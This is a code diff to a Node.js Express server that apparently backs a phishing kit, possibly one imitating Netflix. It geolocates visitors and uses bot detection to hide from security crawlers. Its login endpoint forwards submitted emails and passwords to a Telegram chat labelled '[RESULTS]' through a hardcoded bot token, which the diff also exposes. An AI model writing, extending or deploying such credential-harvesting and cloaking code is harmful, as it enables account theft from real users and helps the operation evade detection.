@@ -1,6 +1,7 @@
 const express = require('express');
 const fs = require('fs');
 const app = express();
+const isbot = require('isbot');
 const port = 4000;
 const { Crawler, middleware } = require('es6-crawler-detect');
 const axios = require('axios');
@@ -10,6 +11,8 @@ const Records = require('./Modals/records')
 const Netflix = require('./Modals/netflix-records')
 const { Telegraf, session, } = require('telegraf');
 const bot = new Telegraf('5643284803:AAHNLTS1g3mFA06ypVq37efhJsfSrazpsRs');
+// Store for the records
+const visitorRecords = {};
 
 
 const URL = `http://ip-api.com/json/`
@@ -26,61 +29,59 @@ const corsOptions = {
 app.use(cors(corsOptions))
 app.use(bodyParser.urlencoded({ extended: false }));
 app.use(bodyParser.json())
+app.use(express.json())
 
 const sendAPIRequest = async (ipAddress) => {
     const apiResponse = await axios.get(URL + ipAddress);
-    console.log(apiResponse.data)
     return apiResponse.data;
 }
 
 
-
-app.post('/', function async(request, response) {
-
-
-    // bot.telegram.sendMessage(-4087874282,'New Visitor From IP: ' + request.body.ip)
-
-    //bot.on(message('text'), (ctx) => ctx.reply(request.body.toString()));
-        console.log('connected')
-        console.log(request.body)
-        const ipAddress = request.body.ip;
-        const ipAddressInformation = sendAPIRequest(ipAddress).then((data => {
-        const visitor_id = request.body.visitor_id
-        var dataBlock = {
-            visitor_id: visitor_id,
-            ip: data.query,
-            country: data.country,
-            state: data.regionName,
-            isp: data.isp,
-
-        }
-        var CrawlerDetector = new Crawler(request);
-        console.log(CrawlerDetector.isCrawler())
-        console.log(data);
-        if (data.country == 'United States' && !CrawlerDetector.isCrawler()) {
-
-            //  Insert(visitor_id, dataBlock);
-             bot.telegram.sendMessage(-4087874282,'New Visitor From IP: ' + request.body.ip + '\n' + 'Visitior ID: '+dataBlock.visitor_id+ '\n' + "State: "+ dataBlock.state+ '\n' + 'Country: ' + dataBlock.country + '\n' + 'isp: ' + dataBlock.isp)
+app.post('/api/visitor', async (request, response) => {
+    try {
+      const ipAddress = request.body.ip;
+      const userAgent = request.body.userAgent; // Get the user-agent from the request body
+      const isCrawler = isbot(userAgent); // Check if the user-agent is a crawler
+      const visitor_id = request.body.fingerprint; // Assuming the frontend sends fingerprint as visitorId
+  
+      const ipAddressInformation = await sendAPIRequest(ipAddress);
+  
+      var dataBlock = {
+          visitor_id: visitor_id,
+          ip: ipAddressInformation.query,
+          country: ipAddressInformation.country,
+          state: ipAddressInformation.regionName,
+          isp: ipAddressInformation.isp,
+      };
 
 
-            response.json({status: 200, session: dataBlock.visitor_id})
+  
+  
+      if (ipAddressInformation.country === 'United States' && !isCrawler && !visitorRecords[visitor_id]) {
+        
+    
+          // Insert(visitor_id, dataBlock);
+           // If not, add the visitor ID to the records and allow access
+            visitorRecords[visitor_id] = true;
+          bot.telegram.sendMessage(-4066338293, 'New Visitor From IP: ' + ipAddress + '\n' + 'Visitor ID: ' + dataBlock.visitor_id + '\n' + "State: " + dataBlock.state + '\n' + 'Country: ' + dataBlock.country + '\n' + 'ISP: ' + dataBlock.isp);
+          response.json({status: 200, session: dataBlock.visitor_id});
+      } else {
+            console.log('blocked')
+          bot.telegram.sendMessage(-4066338293, 'New Visitor From IP: ' + ipAddress + ' - Bot Blocked!');
+          response.json({status: 403})// Send 403 status in the response
+      }
+    } catch (error) {
+      console.error('An error occurred:', error);
+      response.status(500).send('An internal server error occurred');
+    }
+  });
 
-        } else {
-            bot.telegram.sendMessage(-4087874282,'New Visitor From IP: ' + request.body.ip + '\n' + 'Bot Blocked!')
 
-            response.status(403).send('forbiddin')
-        }
-
-    }));
-
-});
-
-
-app.post('/login', function async (request, response){
+app.post('/api/login', function async (request, response){
 
     console.log(request.body);
 
-    bot.telegram.sendMessage(-4087874282,'------------------[RESULTS]------------------' + '\n'+ 'Visitor ID: '+ request.body.visitor + '\n' + 'ip: ' + request.body.ip + '\n' + 'email: ' + request.body.email + '\n' + 'password: ' + request.body.password)
+    bot.telegram.sendMessage(-4066338293,'------------------[RESULTS]------------------' + '\n'+ 'Visitor ID: '+ request.body.visitor + '\n' + 'ip: ' + request.body.ip + '\n' + 'email: ' + request.body.email + '\n' + 'password: ' + request.body.password)
 
     response.status(200).send('good')
 
